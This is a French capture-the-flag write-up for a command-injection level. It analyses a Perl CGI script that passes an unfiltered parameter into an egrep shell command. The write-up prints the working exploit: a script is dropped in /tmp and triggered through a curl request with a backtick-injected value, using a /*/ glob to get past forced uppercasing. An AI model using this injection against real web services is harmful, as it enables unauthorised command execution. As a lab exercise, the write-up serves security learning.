# 12 Commande Injection

Le code Perl effectue les actions suivantes  :

1. Cherche dans un fichier (/tmp/xd) une ligne qui commence par un mot (en majuscules) fourni en paramètre.
2. Vérifie si une seconde partie de cette ligne contient un autre mot fourni en paramètre.
3. Si une correspondance est trouvée, il retourne 1, sinon 0.
4. La fonction n affiche un symbole (.. ou .) selon un paramètre passé, pour donner une indication visuelle.

|   |Fonctionnement du Script Perl `localhost:4646`                                                        |
| -------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Objectif**         | Fournit une réponse HTML : type de contenu = "text/html".                                                                                               |
| **Sous-routine 't'** | Effectue une recherche dans le fichier `/tmp/xd` en fonction de paramètres passés (`$xx` et `$nn`).<br> tr/a-z/A-Z/ => transforme **tout en majuscule** |
| **Sous-routine 'n'** | Cette sous-routine imprime ".." si le paramètre est égal à 1, sinon elle imprime ".".                                                                   |



### Injection à cause de la vulnérabilité
``@output = `egrep "^$xx" /tmp/xd 2>&1`;``
* La chaîne `$xx` est utilisée directement dans la commande shell sans être filtrée ou validée


### Commandes réalisées
```bash
cat level12.pl
cd tmp
echo "getflag > /tmp/token" > /tmp/GETTOKEN && chmod +x /tmp/GETTOKEN
curl localhost:4646?x='`/*/GETTOKEN`'
cat token
```


### Exploit
```bash
echo "getflag > /tmp/token" > /tmp/GETTOKEN && chmod +x /tmp/GETTOKEN
curl localhost:4646?x='`/*/GETTOKEN`' 
```
* Le fichier et le chemin d'accès doivent être en majuscule d'où le /*/GETTOKEN